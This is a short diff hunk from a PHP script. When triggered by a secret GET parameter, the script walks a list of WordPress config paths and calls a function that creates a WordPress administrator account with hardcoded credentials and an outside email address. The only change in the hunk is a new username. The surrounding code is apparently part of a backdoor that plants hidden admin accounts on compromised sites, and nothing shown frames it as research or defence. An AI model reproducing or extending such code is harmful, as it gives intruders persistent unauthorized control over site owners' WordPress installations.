@@ -59,7 +59,7 @@ if (isset($_GET['GET']) && $_GET['GET'] === 'WP') {
         $config_path = $config['path'];
         writeLog("Processing config #$index: $config_path");
         
-        $username = 'akuadminkausiapa';
+        $username = 'adminnyabiskuat';
         $password = 'kamupakainanya';
         $admin_email = 'vertonix11@gmail.com';
         $result = frida_create_wp_admin($config_path, $username, $password, $admin_email);
